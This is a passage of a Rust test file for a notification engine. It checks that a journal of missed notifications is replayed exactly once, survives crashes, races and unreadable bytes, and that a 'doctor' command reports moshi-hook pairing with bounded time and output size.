    );
    assert!(
        events(&sandbox, "macos-banner").is_empty(),
        "nothing was delivered, replay included"
    );
    assert_eq!(
        std::fs::read(journal_path(&sandbox)).expect("the journal"),
        before,
        "the queue was consumed with nowhere to send it"
    );
}

#[test]
fn the_claim_never_survives_the_run_whether_the_replay_delivered_or_not() {
    // THE CLAIM IS REMOVED BEFORE DELIVERY, never after, so a channel that
    // hangs to its deadline and takes the process with it cannot leave an
    // orphan in the state directory for the next run to trip over.
    let delivered = Sandbox::new("replay-claim-delivered");
    record_every_event(&delivered);
    std::fs::write(journal_path(&delivered), planted_journal(2)).expect("the journal");
    run(&mut present_event(&delivered));
    assert_eq!(
        events(&delivered, "macos-banner").len(),
        2,
        "the replay really was delivered"
    );
    assert_eq!(
        state_files(&delivered),
        ["decisions"],
        "a delivered replay left a claim behind"
    );

    // AND THE RUN THAT NEVER FINISHED. The banner hangs on the replay alone,
    // so the live event is delivered first and the process is killed while it
    // is inside the catch-up's own dispatch. A claim removed AFTER delivery is
    // still on disk at that moment.
    let killed = Sandbox::new("replay-claim-killed");
    record_every_event(&killed);
    killed.stub_channel(
        "macos-banner",
        &format!(
            "payload=$(cat)\nprintf '%s\\n' \"$payload\" >>\"{root}/macos-banner.events\"\n\
             case \"$payload\" in\n  *'\"state\":\"missed\"'*) : >\"{root}/inside.the.replay\"; \
             for _ in $(seq 1 200); do [ -e \"{root}/the.test.is.over\" ] && break; sleep 0.05; done ;;\nesac",
            root = killed.display()
        ),
    );
    std::fs::write(journal_path(&killed), planted_journal(2)).expect("the journal");
    let mut command = present_event(&killed);
    let mut child = command
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("the engine starts");
    let inside = killed.path("inside.the.replay");
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(20);
    while !inside.exists() {
        assert!(
            std::time::Instant::now() < deadline,
            "the replay never reached a channel"
        );
        std::thread::sleep(std::time::Duration::from_millis(10));
    }
    let _ = child.kill();
    let _ = child.wait();
    // RELEASED BEFORE THE ASSERTIONS. The channel is a CHILD OF THE ENGINE
    // and outlives the kill, so a stub left sleeping holds a deleted sandbox
    // open for as long as it sleeps; it waits on this file instead and ends
    // with the test rather than on a timer of its own.
    std::fs::write(killed.path("the.test.is.over"), "").expect("the release");
    assert_eq!(
        state_files(&killed),
        ["decisions"],
        "the journal was still claimed, or its claim still on disk, mid-delivery"
    );
}

/// Every claim the state directory holds, which is where an undelivered batch
/// waits when a run could not read it or did not survive to hand it over.
fn claim_files(sandbox: &Sandbox) -> Vec<String> {
    state_files(sandbox)
        .into_iter()
        .filter(|name| name.starts_with("missed-notifications.claim."))
        .collect()
}

#[test]
fn a_journal_this_run_could_not_read_is_left_on_disk_rather_than_consumed() {
    // MEASURED ON THE SHIPPED BUILD: the claim was removed before the read was
    // known to have worked, so a journal carrying one undecodable byte came
    // back as an empty batch and the whole queue was gone. Nothing delivered,
    // nothing left, nothing said.
    //
    // AN UNDELIVERED BATCH IS NEVER DESTROYED. What this run cannot read it
    // leaves exactly as it is, under a claim name the NEXT return adopts.
    let sandbox = Sandbox::new("replay-unreadable");
    record_every_event(&sandbox);
    let mut waiting = planted_journal(2).into_bytes();
    // A BYTE NO READER CAN DECODE, which is what the guarded reader refuses:
    // the journal is a plain file a backup tool or a hand edit can reach.
    waiting.extend_from_slice(b"\xff\xfe not text\n");
    std::fs::write(journal_path(&sandbox), &waiting).expect("the journal");

    run(&mut present_event(&sandbox));

    let raised = events(&sandbox, "macos-banner");
    assert_eq!(
        raised.len(),
        1,
        "a batch nobody could read was delivered anyway: {raised:?}"
    );
    let left = claim_files(&sandbox);
    assert_eq!(
        left.len(),
        1,
        "the undelivered batch was destroyed: {:?}",
        state_files(&sandbox)
    );
    assert_eq!(
        std::fs::read(sandbox.path(&format!("state/{}", left[0]))).expect("the claim"),
        waiting,
        "what is left is not byte for byte what was waiting"
    );
}

#[test]
fn a_claim_an_earlier_run_never_finished_is_adopted_by_the_next_return() {
    // THE STRANDED CLAIM. A run killed between the rename and the delivery,
    // and a run that could not read what it claimed, both leave a claim file
    // behind; before this nothing ever looked at one again, so the queue sat
    // in the state directory for good and the doctor's count could not even
    // see it, because that count reads the journal's own name.
    let sandbox = Sandbox::new("replay-adopts-a-claim");
    record_every_event(&sandbox);
    let stranded = journal_path(&sandbox).with_extension("claim.999999");
    std::fs::write(&stranded, planted_journal(2)).expect("the stranded claim");

    run(&mut present_event(&sandbox));

    let raised = events(&sandbox, "macos-banner");
    assert_eq!(
        raised.len(),
        2,
        "the stranded batch never reached the operator: {raised:?}"
    );
    assert_eq!(raised[1]["state"], "missed", "{raised:?}");
    let body = raised[1]["detail"].as_str().expect("a detail");
    assert!(
        body.starts_with("2 missed notifications. "),
        "both stranded entries were adopted: {body}"
    );
    assert_eq!(
        state_files(&sandbox),
        ["decisions"],
        "the adopted claim outlived the delivery it rode on"
    );
}

#[test]
fn a_line_nothing_can_parse_costs_the_entries_around_it_nothing() {
    // A READABLE JOURNAL WITH A TORN LINE IN IT is not the same thing as a
    // claim nobody can read, and the two must not be answered the same way:
    // the append's own heal can republish a single line over this file, and
    // one line nobody can parse must not cost the notifications around it.
    let sandbox = Sandbox::new("replay-torn-line");
    record_every_event(&sandbox);
    std::fs::write(
        journal_path(&sandbox),
        format!("{}{{\"agent\":\"claude\",\n", planted_journal(2)),
    )
    .expect("the journal");

    run(&mut present_event(&sandbox));

    let raised = events(&sandbox, "macos-banner");
    assert_eq!(raised.len(), 2, "{raised:?}");
    let body = raised[1]["detail"].as_str().expect("a detail");
    assert!(
        body.starts_with("2 missed notifications. "),
        "the torn line is not an entry and is not counted: {body}"
    );
    assert_eq!(
        state_files(&sandbox),
        ["decisions"],
        "a journal that read back whole is consumed whole"
    );
}

#[test]
fn a_present_event_narrowed_to_the_log_leaves_the_queue_for_a_surface_that_shows_it() {
    // MEASURED: `--remote-only` keeps the durable log alone, and a log is not
    // a surface anyone is looking at. The queue was claimed, posted into a log
    // that already holds every one of those events in full, and deleted, with
    // nothing the operator would ever see. A REPLAY NEEDS A DECORATIVE LEG.
    let sandbox = Sandbox::new("replay-remote-only");
    record_every_event(&sandbox);
    std::fs::write(journal_path(&sandbox), planted_journal(2)).expect("the journal");
    let before = std::fs::read(journal_path(&sandbox)).expect("the journal");

    run(present_event(&sandbox).arg("--remote-only"));

    let logged = events(&sandbox, "hermes");
    assert_eq!(
        logged.len(),
        1,
        "the live event alone reached the log: {logged:?}"
    );
    assert_eq!(logged[0]["state"], "done", "{logged:?}");
    assert_eq!(
        std::fs::read(journal_path(&sandbox)).expect("the journal"),
        before,
        "the queue was consumed by a run that could show none of it"
    );
}

#[test]
fn a_machine_with_only_a_durable_channel_never_consumes_the_queue_it_cannot_show() {
    // THE SAME HOLE WITH NO FLAG TYPED. A machine whose config enables hermes
    // alone still plans the banner the matrix asked for, and has nothing to
    // raise it with, so every present event would quietly eat the queue.
    let sandbox = Sandbox::new("replay-durable-only");
    record_every_event(&sandbox);
    sandbox.write_config("[plugins.hermes]\nenabled = true\n");
    std::fs::write(journal_path(&sandbox), planted_journal(2)).expect("the journal");
    let before = std::fs::read(journal_path(&sandbox)).expect("the journal");

    run(&mut present_event(&sandbox));

    let logged = events(&sandbox, "hermes");
    assert_eq!(
        logged.len(),
        1,
        "the live event alone reached the log: {logged:?}"
    );
    assert_eq!(
        std::fs::read(journal_path(&sandbox)).expect("the journal"),
        before,
        "the queue was consumed on a machine with no surface to show it on"
    );
}

#[test]
fn a_directory_at_the_journals_path_is_put_back_exactly_where_it_was_found() {
    // THE CLAIM'S GUARD IS THE RENAME ITSELF. A check taken BEFORE it is a
    // check of a path something else is still free to change, so what the
    // rename actually claimed is verified AFTER it lands: anything that is not
    // a regular file goes back to the journal's own path untouched, and this
    // run declines rather than removing something it never wrote.
    let sandbox = Sandbox::new("replay-directory");
    record_every_event(&sandbox);
    // A MARKER INSIDE IT, so the assertion is that THIS directory came back
    // rather than that something directory-shaped is at the path.
    let planted = journal_path(&sandbox).join("not-a-journal");
    std::fs::create_dir_all(&planted).expect("a directory at the journal's path");

    run(&mut present_event(&sandbox));

    assert!(
        planted.is_dir(),
        "the directory never came back: {:?}",
        state_files(&sandbox)
    );
    assert_eq!(
        state_files(&sandbox),
        ["decisions", "missed-notifications"],
        "something was left standing at a claim path"
    );
    let raised = events(&sandbox, "macos-banner");
    assert_eq!(raised.len(), 1, "the live event alone: {raised:?}");
}

/// How many present events race for one planted journal.
///
/// WHAT THIS PIN IS AND IS NOT, measured rather than claimed. On the build
/// below it is a hard assertion: every run delivers exactly one replay. As a
/// hunt for a build that claims by READING AND THEN REMOVING it is a
/// probability, because that mutant only loses when two runs land inside the
/// same few microseconds: it died in one run of five here at eight racers and
/// two of eight at twenty four, so raising the count does not buy
/// determinism (the spawn spread grows with it, and the arrivals stay just as
/// thin). Eight is kept because it is the cheaper of two equal odds, and
/// because the standing assertion, not the mutant, is what this test is for.
const RACERS: usize = 8;

#[test]
fn racing_present_events_deliver_exactly_one_replay_between_them() {
    // THE CLAIM IS A RENAME BECAUSE OF THIS. Two events firing at once is
    // ordinary here (a Stop hook and the long-running notifier are a normal
    // pair), and a read-then-remove hands the same batch to every one of them:
    // the operator gets the same missed notifications over and over.
    let sandbox = Sandbox::new("replay-race");
    record_every_event(&sandbox);
    std::fs::write(journal_path(&sandbox), planted_journal(2)).expect("the journal");

    // EVERY COMMAND IS BUILT BEFORE THE FIRST SPAWN: building one WRITES the
    // herdr stub, and rewriting a script another racer is already executing is
    // a flake rather than the race under test.
    let mut commands: Vec<std::process::Command> =
        (0..RACERS).map(|_| present_event(&sandbox)).collect();
    let racers: Vec<std::process::Child> = commands
        .iter_mut()
        .map(|command| {
            command
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::piped())
                .spawn()
                .expect("the engine starts")
        })
        .collect();
    for mut racer in racers {
        // BOUNDED, so a wedged racer fails this test rather than parking the
        // suite behind it.
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(30);
        while racer.try_wait().expect("the child is waitable").is_none() {
            assert!(std::time::Instant::now() < deadline, "a racer never exited");
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
        let done = racer.wait_with_output().expect("the child is waitable");
        assert!(done.status.success(), "a racer failed: {}", stderr(&done));
        assert_eq!(stdout(&done), "", "a racer printed a line");
    }

    // THE DESK ROW EARNS THE BANNER AND NOT THE CARD, so the two legs below
    // are what every racer reached and the phone is the control.
    for channel in ["macos-banner", "hermes"] {
        let delivered = events(&sandbox, channel);
        assert_eq!(
            delivered.len(),
            RACERS + 1,
            "{channel} saw something other than {RACERS} live events and one replay: {delivered:?}"
        );
        assert_eq!(
            delivered
                .iter()
                .filter(|event| event["state"] == "missed")
                .count(),
            1,
            "{channel} was handed the one batch more than once: {delivered:?}"
        );
    }
    assert!(
        events(&sandbox, "moshi").is_empty(),
        "the phone is not a leg for an operator at the desk"
    );
    assert_eq!(
        state_files(&sandbox),
        ["decisions"],
        "the journal survived the race, or a racer left its claim behind"
    );
}

// --- the moshi pairing check ------------------------------------------------

#[test]
fn the_doctor_prints_the_pairing_section_between_its_summary_and_the_decision_section() {
    // HEALTH SITS WITH HEALTH AND HISTORY GOES LAST. The pairing check can
    // move the exit code and the decision log explicitly cannot, so grouping
    // them the other way would put a gradeable line below an ungradeable one.
    let sandbox = Sandbox::new("doctor-pairing-placement");
    sandbox.write_config(EVERY_DISPATCHED_CHANNEL);
    run(logged_event(&sandbox).args(["--agent", "claude", "--state", "done"]));
    let mut command = doctor_command(&sandbox);
    stub_moshi_hook(
        &sandbox,
        &mut command,
        PAIRED_STATUS_JSON,
        PAIRED_STATUS_PLAIN,
    );
    let output = command.output().expect("the engine runs");

    let printed = stdout(&output);
    let lines: Vec<&str> = printed.lines().collect();
    let summary = lines
        .iter()
        .position(|line| *line == "pns doctor: 3 sent, 0 failed, 2 skipped")
        .unwrap_or_else(|| panic!("no summary line in {printed}"));
    assert_eq!(lines[summary + 1], PAIRED_LINE, "{printed}");
    assert_eq!(lines[summary + 2], MOSHI_SAYS_LINE, "{printed}");
    assert_eq!(
        lines[summary + 3],
        format!("pns doctor: the last decision,{DECISION_HEADING_TAIL}"),
        "the decision section still comes last: {printed}"
    );
}

#[test]
fn the_doctor_runs_moshi_hook_exactly_twice_and_never_probes() {
    // TWO SPAWNS OF ONE SUBCOMMAND, and `probe` ZERO TIMES. Measured on 0.3.3,
    // probe answers `running: true` and `gateway: true` against a HOME holding
    // no pairing at all, so nothing it reports can be stated honestly.
    let sandbox = Sandbox::new("doctor-pairing-argv");
    sandbox.write_config(EVERY_DISPATCHED_CHANNEL);
    let mut command = doctor_command(&sandbox);
    stub_moshi_hook(
        &sandbox,
        &mut command,
        PAIRED_STATUS_JSON,
        PAIRED_STATUS_PLAIN,
    );
    command.output().expect("the engine runs");

    let recorded = moshi_hook_argv(&sandbox);
    assert_eq!(
        recorded,
        [vec!["status", "--json"], vec!["status"]],
        "the local fact is read first and off its own call, so a slow network \
         cannot cost the doctor an answer it already had"
    );
    assert!(
        !recorded
            .iter()
            .flatten()
            .any(|argument| argument == "probe"),
        "{recorded:?}"
    );
}

#[test]
fn a_doctor_with_no_moshi_hook_to_run_says_so_and_leaves_the_exit_code_to_the_sends() {
    // A MACHINE THAT DOES NOT USE MOSHI MUST NOT FAIL ITS DOCTOR FOREVER. The
    // helper already points this at a path that does not exist, which is the
    // real absent case rather than a flag.
    let sandbox = Sandbox::new("doctor-pairing-absent");
    sandbox.write_config(EVERY_DISPATCHED_CHANNEL);
    let output = doctor_command(&sandbox).output().expect("the engine runs");

    let printed = stdout(&output);
    assert!(printed.contains(NO_MOSHI_HOOK_LINE), "{printed}");
    assert!(
        !printed.contains("moshi says"),
        "there is nothing to relay: {printed}"
    );
    assert_eq!(
        output.status.code(),
        Some(0),
        "the sends alone earned it: {}",
        stderr(&output)
    );
}

#[test]
fn a_moshi_hook_that_never_returns_does_not_park_the_doctor() {
    // THE PLAIN CALL IS THE ONLY NETWORK I/O THE DOCTOR DOES ON ITS OWN
    // BEHALF, so it is the one place a hang could park a hand-typed command.
    // The json call still answers, which is the whole argument for splitting
    // them: the local fact is not hostage to the network.
    let sandbox = Sandbox::new("doctor-pairing-hang");
    sandbox.write_config(EVERY_DISPATCHED_CHANNEL);
    let bin = sandbox.path("bin");
    std::fs::create_dir_all(&bin).expect("stub bin");
    let script = bin.join("moshi-hook");
    write_script(
        &script,
        &format!(
            "case \"$*\" in\n\
             *--json*) printf '%s' '{PAIRED_STATUS_JSON}' ;;\n\
             *) exec sleep 30 ;;\n\
             esac"
        ),
    );
    let mut command = doctor_command(&sandbox);
    command.env("MOSHI_HOOK_BIN", &script);
    command.env("PNS_MOSHI_STATUS_DEADLINE_MS", "200");

    let started = std::time::Instant::now();
    let output = command.output().expect("the engine runs");
    let waited = started.elapsed();

    assert!(
        waited < std::time::Duration::from_secs(2),
        "the doctor waited {waited:?} on a call it bounds"
    );
    let printed = stdout(&output);
    assert!(
        printed.contains(PAIRED_LINE),
        "the local fact answered anyway: {printed}"
    );
    assert!(
        !printed.contains("moshi says"),
        "a call that never answered relays nothing: {printed}"
    );
    assert!(
        printed.contains("pns doctor: 3 sent, 0 failed, 2 skipped"),
        "and the sections printed before it survived: {printed}"
    );
    assert_eq!(output.status.code(), Some(0), "stderr: {}", stderr(&output));

    // AND THE OTHER LEG THE OTHER WAY. The json call is the one nothing was
    // pinning: it reaches no network today, but "today" is the whole reason
    // to pin it, and an unbounded spawn there parks the same hand-typed
    // command the plain leg is bounded to protect.
    let sandbox = Sandbox::new("doctor-pairing-hang-json");
    sandbox.write_config(EVERY_DISPATCHED_CHANNEL);
    let bin = sandbox.path("bin");
    std::fs::create_dir_all(&bin).expect("stub bin");
    let script = bin.join("moshi-hook");
    write_script(
        &script,
        &format!(
            "case \"$*\" in\n\
             *--json*) exec sleep 30 ;;\n\
             *) printf '%s' '{PAIRED_STATUS_PLAIN}' ;;\n\
             esac"
        ),
    );
    let mut command = doctor_command(&sandbox);
    command.env("MOSHI_HOOK_BIN", &script);
    command.env("PNS_MOSHI_JSON_DEADLINE_MS", "200");

    let started = std::time::Instant::now();
    let output = command.output().expect("the engine runs");
    let waited = started.elapsed();

    assert!(
        waited < std::time::Duration::from_secs(2),
        "the doctor waited {waited:?} on the json call"
    );
    let printed = stdout(&output);
    assert!(
        printed.contains(NO_MOSHI_HOOK_LINE),
        "a leg that never answered is a leg that could not be graded: {printed}"
    );
    assert!(
        printed.contains(MOSHI_SAYS_LINE),
        "and the other leg's answer still arrives: {printed}"
    );
    assert_eq!(output.status.code(), Some(0), "stderr: {}", stderr(&output));
}

#[test]
fn an_unpaired_host_exits_one_while_the_summary_still_reads_zero_failed() {
    // THE GAP THIS CHECK EXISTS FOR. Every send is green, the census reports
    // the moshi channel green over its webhook, and every approval card is
    // dead. The summary counts SENDS and says so; the pairing line is printed
    // directly above in plain words.
    let sandbox = Sandbox::new("doctor-pairing-unpaired");
    sandbox.write_config(EVERY_DISPATCHED_CHANNEL);
    let mut command = doctor_command(&sandbox);
    stub_moshi_hook(
        &sandbox,
        &mut command,
        UNPAIRED_STATUS_JSON,
        UNPAIRED_STATUS_PLAIN,
    );
    let output = command.output().expect("the engine runs");

    let printed = stdout(&output);
    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    assert!(
        printed.contains("pns doctor: 3 sent, 0 failed, 2 skipped"),
        "{printed}"
    );
    assert!(
        printed.contains(
            "pns doctor: moshi pairing: this host is NOT paired, so every \
             approval card is dead until `moshi-hook pair` runs."
        ),
        "{printed}"
    );
    assert!(
        !printed.contains("moshi says"),
        "an unpaired host prints no server line at all: {printed}"
    );
}

#[test]
fn the_pairing_check_records_nothing_of_its_own() {
    // NOTHING IS WRITTEN TO THE STATE DIRECTORY. The check reads two answers
    // out of another binary and prints; a run that left a record behind would
    // be a second writer of a ring with no reader of its own.
    let sandbox = Sandbox::new("doctor-pairing-readonly");
    sandbox.write_config(EVERY_DISPATCHED_CHANNEL);
    run(logged_event(&sandbox).args(["--agent", "claude", "--state", "done"]));
    let listing = |sandbox: &Sandbox| {
        let mut names: Vec<String> = std::fs::read_dir(sandbox.path("state"))
            .expect("the state dir")
            .flatten()
            .map(|entry| entry.file_name().to_string_lossy().into_owned())
            .collect();
        names.sort();
        names
    };
    let before = listing(&sandbox);
    let ring_before = std::fs::read_to_string(sandbox.path("state/decisions")).expect("the ring");

    let mut command = doctor_command(&sandbox);
    stub_moshi_hook(
        &sandbox,
        &mut command,
        PAIRED_STATUS_JSON,
        PAIRED_STATUS_PLAIN,
    );
    let output = command.output().expect("the engine runs");

    assert!(
        stdout(&output).contains(PAIRED_LINE),
        "the check has to have RUN for this to say anything: {}",
        stdout(&output)
    );
    assert_eq!(listing(&sandbox), before, "the pairing check left a file");
    assert_eq!(
        std::fs::read_to_string(sandbox.path("state/decisions")).expect("the ring"),
        ring_before,
        "the pairing check wrote to the ring"
    );
}

#[test]
fn an_answer_over_the_byte_cap_is_refused_on_both_legs_rather_than_read() {
    // THE DEADLINES BOUND TIME, NOT BYTES. A moshi-hook that answered
    // endlessly would be inside its window the whole time while the JSON leg
    // handed the lot to serde and the plain leg scanned every line of it.
    //
    // BOTH ANSWERS BELOW ARE WELL FORMED and would read as a healthy paired
    // host if anything read them: only their SIZE is wrong. Junk bytes would
    // land on Unreadable through serde and prove nothing about the cap.
    let sandbox = Sandbox::new("doctor-pairing-over-cap");
    sandbox.write_config(EVERY_DISPATCHED_CHANNEL);
    let bin = sandbox.path("bin");
    std::fs::create_dir_all(&bin).expect("stub bin");
    let script = bin.join("moshi-hook");
    write_script(
        &script,
        "case \"$*\" in\n\
         *--json*) printf '{\"paired\":true,\"displayName\":\"dresden\",\
         \"hostId\":\"host_over_cap\",\"pad\":\"%1100000s\"}' '' ;;\n\
         *) printf 'server:       Moshi Pro attached (usage scope: license)\\n%1100000s\\n' '' ;;\n\
         esac",
    );
    let mut command = doctor_command(&sandbox);
    command.env("MOSHI_HOOK_BIN", &script);

    let started = std::time::Instant::now();
    let output = command.output().expect("the engine runs");
    let waited = started.elapsed();

    let printed = stdout(&output);
    assert!(
        printed
            .contains("pns doctor: moshi pairing: moshi-hook answered something this cannot read."),
        "an over-cap answer is refused before it is parsed: {printed}"
    );
    assert!(
        !printed.contains("dresden") && !printed.contains("host_over_cap"),
        "the over-cap answer was parsed anyway: {printed}"
    );
    assert!(
        !printed.contains("moshi says"),
        "an over-cap answer is refused before it is scanned: {printed}"
    );
    assert!(
        waited < std::time::Duration::from_secs(5),
        "the doctor spent {waited:?} on an answer it refused"
    );
}
